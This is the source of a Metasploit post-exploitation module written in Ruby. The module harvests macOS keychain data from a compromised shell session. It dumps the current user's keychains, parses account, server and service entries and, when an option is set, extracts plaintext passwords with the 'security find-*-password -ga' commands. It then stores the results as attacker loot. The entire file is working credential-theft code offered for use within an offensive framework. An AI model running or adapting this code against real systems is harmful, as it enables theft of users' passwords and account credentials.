##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/core/post/common'

class Metasploit3 < Msf::Post

	include Msf::Post::Common

	def initialize(info={})
		super(update_info(info,
			'Name'			=> 'OSX Gather Enumerate Keychain',
			'Description'	=> %q{
				This module presents a way to quickly go through the current users keychains and collect data such as email accounts, servers, and other services.
			},
			'License'		=> MSF_LICENSE,
			'Author'		=> [ 'ipwnstuff <e@ipwnstuff.com>'],
			'Platform'		=> [ 'osx' ],
			'SessionTypes'	=> [ 'shell' ],
		))

		register_options(
			[
				OptBool.new('GETPASS',
				[false, 'Adds passwords to the if the host clicks "allow" on prompt.', false]),
			], self.class)
	end

	def list_keychains
		keychains = session.shell_command_token("security list")
		user = session.shell_command_token("whoami")
		print_status("The following keychains for #{user} were found:\n#{keychains.chomp}")
		return keychains =~ /No such file or directory/ ? nil : keychains
	end

	def enum_accounts(keychains)
		user =  session.shell_command_token("whoami").chomp
		out = session.shell_command_token("security dump | egrep 'acct|desc|srvr|svce'")

		i = 0
		accounts = {}

		out.split("\n").each do |line|
			unless line =~ /NULL/
				case line
				when /\"acct\"/
					i+=1
					accounts[i]={}
					accounts[i]["acct"] = line.split('<blob>=')[1].split('"')[1]
				when /\"srvr\"/
					accounts[i]["srvr"] = line.split('<blob>=')[1].split('"')[1]
				when /\"svce\"/
					accounts[i]["svce"] = line.split('<blob>=')[1].split('"')[1]
				when /\"desc\"/
					accounts[i]["desc"] = line.split('<blob>=')[1].split('"')[1]
				end
			end
		end

		return accounts
	end

	def get_passwords(accounts)
		(1..accounts.count).each do |num|
			if accounts[num].has_key?("srvr")
				cmd = session.shell_command_token("security find-internet-password -ga \"#{accounts[num]["acct"]}\" -s \"#{accounts[num]["srvr"]}\" 2>&1")
			else
				cmd = session.shell_command_token("security find-generic-password -ga \"#{accounts[num]["acct"]}\" -s \"#{accounts[num]["svce"]}\" 2>&1")
			end

			cmd.split("\n").each do |line|
				if line =~ /password: /
					unless line.split()[1].nil?
						accounts[num]["pass"] = line.split()[1].gsub("\"","")
					else
						accounts[num]["pass"] = nil
					end
				end
			end
		end
		return accounts
	end

	def save(data)
		l = store_loot('macosx.keychain.info',
			'plain/text',
			session,
			data,
			'keychain-info.txt',
			'Mac Keychain Account/Server/Service/Description')
			print_good("#{@peer} - Keychain information saved in #{l}")
	end

	def run
		@peer = "#{session.session_host}:#{session.session_port}"
		
		keychains = list_keychains
		if keychains.nil?
			print_error("#{@peer} - Module timed out, no keychains found.")
			return
		else
			user = session.shell_command_token("/usr/bin/whoami").chomp
			accounts = enum_accounts(keychains)
			if datastore['GETPASS']
				begin
				passwords = get_passwords(accounts)
				rescue
				print_error("#{@peer} - Module timed out, no passwords found.\n This is likely due to the host not responding to the prompt.")
				save(accounts)
				return
				end
				save(passwords)
			else
				save(accounts)
			end
		end
	end

end
